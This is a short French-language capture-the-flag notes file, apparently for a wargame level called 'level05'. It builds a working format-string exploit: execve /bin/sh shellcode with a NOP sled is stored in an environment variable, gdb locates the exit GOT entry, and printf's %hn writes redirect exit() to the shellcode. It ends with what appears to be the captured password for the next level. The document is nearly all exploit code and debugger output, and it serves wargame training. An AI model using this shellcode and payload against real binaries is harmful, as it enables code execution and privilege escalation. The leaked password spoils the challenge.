export SHELLCODE=$(python -c 'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

Printf dispo pour format string injection.
Pas de return mais un exit() donc on va modif la plt.

0x08048513 <+207>:   call   0x8048370 <exit@plt>
(gdb) x/i 0x8048370
0x8048370 <exit@plt>:        jmp    *0x80497e0


(gdb) info variable environ
All variables matching regular expression "environ":
Non-debugging symbols:
0xf7fd0e04  __environ
0xf7fd0e04  _environ
0xf7fd0e04  environ

(gdb) x/x 0xf7fd0e04
0xf7fd0e04 <environ>:   0xffffd29c
(gdb) x/x 0xffffd29c
0xffffd29c:     0xffffd3fa
(gdb) x/s 0xffffd3fa
0xffffd3fa:      "LC_PAPER=fr_FR.UTF-8"
(gdb) x/5s 0xffffd3fa
0xffffd3fa:      "LC_PAPER=fr_FR.UTF-8"
0xffffd40f:      "LC_ADDRESS=fr_FR.UTF-8"
0xffffd426:      "LC_MONETARY=fr_FR.UTF-8"
0xffffd43e:      "SHELLCODE=\220\220.....
.........................................

0xffffd43e + 10 = 0xffffd448 pour ne pas avoir "SHELLCODE="

On peut encore decaler pour etre sur de taper dans les \x90
+512 = 0xffffd63e

offset de printf:
(python -c 'print "aaaa" + "%x"*24') | ./level05
aaaa64f7fcfac0f7ec3af9ffffd1afffffd1ae0ffffffffffffd234061616161
----                                                    --------
soit (python -c 'print "AAAA" + "%10$x"')


On ecrit d'abord la partie basse car la somme de la partie haute est plus grande:
d63e: 54846 - 8 = 54838
ffff: 65535 - 54838 - 8 = 10689

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54838d" + "%10$hn" + "%10689d" + "%11$hn"' ; cat) | ./level05



h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq